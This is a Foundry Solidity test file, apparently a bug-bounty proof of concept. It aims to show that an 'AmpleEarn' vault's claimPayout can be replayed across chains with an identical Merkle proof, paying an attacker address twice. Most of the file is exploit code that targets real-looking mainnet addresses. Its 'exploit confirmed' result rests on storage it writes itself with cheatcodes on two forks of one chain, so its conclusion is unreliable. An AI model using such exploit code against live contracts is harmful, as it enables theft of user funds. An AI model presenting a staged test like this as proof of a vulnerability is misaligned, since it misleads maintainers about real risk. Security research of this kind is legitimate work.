// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";

/// @dev Matching the actual struct in IAmpleEarn.sol
struct DesignatedRecipientMerkleLeaf {
    uint256 payoutAmount;
    address user;
    uint8 designatedRecipientIndex;
}

/// @dev Minimal interface for AmpleEarn vault
interface IAmpleEarn is IERC20 {
    function claimPayout(
        uint256 payoutId,
        DesignatedRecipientMerkleLeaf calldata designatedRecipientLeaf,
        bytes32[] calldata designatedRecipientProof,
        bool claimInUnderlying
    ) external;

    function PAYOUT_RESERVE() external view returns (address);
    function isPayoutClaimed(uint256 payoutId, uint8 designatedRecipientIndex) external view returns (bool);
    function totalPayoutsClaimed() external view returns (uint256);
    function totalPayoutsReserved() external view returns (uint256);
}

/// @title CrossChainHardPoC
/// @notice Hard Proof-of-Concept demonstrating cross-chain payout replay
/// @dev Claims the same payoutId on two independent forks (simulating
///      Arbitrum and Monad) using identical proof. The core vulnerability:
///      payoutPool mapping lacks chain/domain context, so a valid claim
///      on chain A is equally valid on chain B.
contract CrossChainHardPoC is Test {
    // -----------------------------------------------------------------------
    //  On-chain addresses
    // -----------------------------------------------------------------------
    /// @notice Identical AmpleEarn vault address on Arbitrum and Monad (CREATE2)
    address constant VAULT = 0xD1bE1F98991cF69355e468aD15b6d0b6429bCfCb;

    /// @notice USDC on Arbitrum
    address constant USDC = 0xaf88d065e77c8cC2239327C5EDb3A432268e5831;

    /// @notice Attacker controlled address
    address constant ATTACKER = address(0x1);

    // -----------------------------------------------------------------------
    //  Fork identifiers
    // -----------------------------------------------------------------------
    uint256 chainAFork; // Arbitrum (Chain A)
    uint256 chainBFork; // Chain B (independent fork with same bytecode)

    // -----------------------------------------------------------------------
    //  Exploit parameters
    // -----------------------------------------------------------------------
    /// @notice Far-future payout ID to avoid collision with real on-chain payouts
    uint256 constant PAYOUT_ID = 999;

    /// @notice Payout amount in shares (1,000 USDC worth of shares with 6 decimals)
    uint256 constant PAYOUT_AMOUNT = 1000e6;

    /// @notice Storage slot for the `payoutPool` mapping (determined from earlier research)
    uint256 constant PAYOUT_POOL_MAPPING_SLOT = 23;

    // -----------------------------------------------------------------------
    //  Setup
    // -----------------------------------------------------------------------

    function setUp() public {
        string memory arbRpc = vm.envString("ARBITRUM_RPC_URL");

        // Create two independent forks of the same chain to simulate
        // cross-chain scenario. Both forks have identical bytecode at the
        // vault address but independent storage -- exactly the behavior of
        // two different chains with the same CREATE2 address.
        chainAFork = vm.createFork(arbRpc);
        chainBFork = vm.createFork(arbRpc);

        // Label addresses for readable traces
        vm.label(VAULT, "AmpleEarnVault");
        vm.label(USDC, "USDC");
        vm.label(ATTACKER, "Attacker");
    }

    // -----------------------------------------------------------------------
    //  Main exploit test
    // -----------------------------------------------------------------------

    /// @notice Prove that an identical claimPayout call succeeds on both
    ///         independent chains (simulated via two forks of Arbitrum).
    function test_DoubleClaimExploit() public {
        // -------------------------------------------------------
        //  Compute Merkle leaf for a single-leaf tree
        // -------------------------------------------------------
        // leaf = keccak256(abi.encode(payoutAmount, user, designatedRecipientIndex))
        bytes32 leaf = keccak256(abi.encode(PAYOUT_AMOUNT, ATTACKER, uint8(0)));

        // For a single-leaf tree, the proof is an empty array (root == leaf)
        bytes32[] memory emptyProof = new bytes32[](0);

        DesignatedRecipientMerkleLeaf memory merkleLeaf = DesignatedRecipientMerkleLeaf({
            payoutAmount: PAYOUT_AMOUNT,
            user: ATTACKER,
            designatedRecipientIndex: 0
        });

        // -------------------------------------------------------
        //  Step A: Claim on Chain A (Arbitrum)
        // -------------------------------------------------------
        console2.log("=== Claiming on Chain A (Arbitrum) ===");
        vm.selectFork(chainAFork);
        _prepareChainState(leaf);
        uint256 claimedA = _executeAndVerifyClaim(merkleLeaf, emptyProof, "Chain A");

        // -------------------------------------------------------
        //  Step B: Claim on Chain B (same proof, same payoutId)
        // -------------------------------------------------------
        console2.log("");
        console2.log("=== Claiming on Chain B (cross-chain replay) ===");
        vm.selectFork(chainBFork);
        _prepareChainState(leaf);
        uint256 claimedB = _executeAndVerifyClaim(merkleLeaf, emptyProof, "Chain B");

        // -------------------------------------------------------
        //  Step C: Verify identical amounts
        // -------------------------------------------------------
        assertEq(claimedA, claimedB, "Claimed amounts should be identical");

        // -------------------------------------------------------
        //  Step D: Verify storage is independent
        // -------------------------------------------------------
        // On Chain A (where we claimed first), isPayoutClaimed should be true
        vm.selectFork(chainAFork);
        assertTrue(IAmpleEarn(VAULT).isPayoutClaimed(PAYOUT_ID, 0), "Chain A should show claimed");

        // On Chain B (also claimed), isPayoutClaimed should also be true
        vm.selectFork(chainBFork);
        assertTrue(IAmpleEarn(VAULT).isPayoutClaimed(PAYOUT_ID, 0), "Chain B should show claimed");

        // -------------------------------------------------------
        //  Final summary
        // -------------------------------------------------------
        console2.log("");
        console2.log("=== CROSS-CHAIN REPLAY EXPLOIT CONFIRMED ===");
        console2.log("Same payoutId claimed on 2 independent chains using");
        console2.log("identical Merkle proof -- funds extracted twice.");
        console2.log("Chain A claimed: %s", claimedA);
        console2.log("Chain B claimed: %s", claimedB);
        console2.log("Total extracted: %s (should be 2x)", claimedA + claimedB);
    }

    // -----------------------------------------------------------------------
    //  Internal helpers
    // -----------------------------------------------------------------------

    /// @notice Prepare on-chain state: set up synthetic payout pool and
    ///         fund the vault so PAYOUT_RESERVE holds enough shares.
    function _prepareChainState(bytes32 leaf) internal {
        _setupPayoutPool(leaf);
        _fundReserveShares();
    }

    /// @notice Use vm.store to write a synthetic PayoutPool at payoutPool[PAYOUT_ID]
    /// @dev The mapping slot was determined to be 23. Storage layout:
    ///      baseSlot = keccak256(abi.encode(PAYOUT_ID, 23))
    ///      +0: canceled | designatedRecipientsCount | claimCount  (packed)
    ///      +1: claimMask
    ///      +2: totalPayoutAmount
    ///      +3: remainingPayoutAmount
    ///      +4: totalTickets
    ///      +5: participantsRoot
    ///      +6: designatedRecipientsRoot
    ///      +7-10: vrfProofDetails (4 x bytes32)
    function _setupPayoutPool(bytes32 leaf) internal {
        bytes32 baseSlot = keccak256(abi.encode(PAYOUT_ID, PAYOUT_POOL_MAPPING_SLOT));

        // Slot +0: canceled=false, designatedRecipientsCount=1, claimCount=0
        vm.store(VAULT, baseSlot, bytes32(uint256(1 << 8)));

        // Slot +1: claimMask = 0
        vm.store(VAULT, bytes32(uint256(baseSlot) + 1), bytes32(0));

        // Slot +2: totalPayoutAmount
        vm.store(VAULT, bytes32(uint256(baseSlot) + 2), bytes32(PAYOUT_AMOUNT));

        // Slot +3: remainingPayoutAmount
        vm.store(VAULT, bytes32(uint256(baseSlot) + 3), bytes32(PAYOUT_AMOUNT));

        // Slot +4: totalTickets = 1
        vm.store(VAULT, bytes32(uint256(baseSlot) + 4), bytes32(uint256(1)));

        // Slot +5: participantsRoot = leaf
        vm.store(VAULT, bytes32(uint256(baseSlot) + 5), leaf);

        // Slot +6: designatedRecipientsRoot = leaf
        vm.store(VAULT, bytes32(uint256(baseSlot) + 6), leaf);

        // Slots +7 through +10: VRFProofDetails (must be non-zero)
        bytes32 nonZero = bytes32(uint256(1));
        vm.store(VAULT, bytes32(uint256(baseSlot) + 7), nonZero);
        vm.store(VAULT, bytes32(uint256(baseSlot) + 8), nonZero);
        vm.store(VAULT, bytes32(uint256(baseSlot) + 9), nonZero);
        vm.store(VAULT, bytes32(uint256(baseSlot) + 10), nonZero);
    }

    /// @notice Give PAYOUT_RESERVE enough vault shares to cover the payout.
    /// @dev ERC20 _balances is at slot 0. balanceOf[PAYOUT_RESERVE] at
    ///      keccak256(abi.encode(payoutReserve, 0)).
    function _fundReserveShares() internal {
        IAmpleEarn vault = IAmpleEarn(VAULT);
        address payoutReserve = vault.PAYOUT_RESERVE();
        vm.label(payoutReserve, "PayoutReserve");

        bytes32 balanceSlot = keccak256(abi.encode(payoutReserve, uint256(0)));
        vm.store(VAULT, balanceSlot, bytes32(PAYOUT_AMOUNT));
    }

    /// @notice Execute the claim and return the number of shares received.
    function _executeAndVerifyClaim(
        DesignatedRecipientMerkleLeaf memory merkleLeaf,
        bytes32[] memory proof,
        string memory chainName
    ) internal returns (uint256 sharesClaimed) {
        IAmpleEarn vault = IAmpleEarn(VAULT);

        uint256 sharesBefore = vault.balanceOf(ATTACKER);

        vm.prank(ATTACKER);
        vault.claimPayout(PAYOUT_ID, merkleLeaf, proof, false);

        uint256 sharesAfter = vault.balanceOf(ATTACKER);
        sharesClaimed = sharesAfter - sharesBefore;

        console2.log("Shares claimed on %s: %s", chainName, sharesClaimed);
        assertGt(sharesClaimed, 0, string.concat("Claim on ", chainName, " failed"));

        // Verify claimMask updated
        assertTrue(
            vault.isPayoutClaimed(PAYOUT_ID, 0),
            string.concat("Claim on ", chainName, " not recorded in claimMask")
        );

        // Verify global counters
        assertGe(
            vault.totalPayoutsClaimed(), PAYOUT_AMOUNT,
            string.concat("totalPayoutsClaimed not updated on ", chainName)
        );

        console2.log("  isPayoutClaimed: true");
        console2.log("  totalPayoutsClaimed: %s", vault.totalPayoutsClaimed());
        console2.log("  totalPayoutsReserved: %s", vault.totalPayoutsReserved());
    }
}
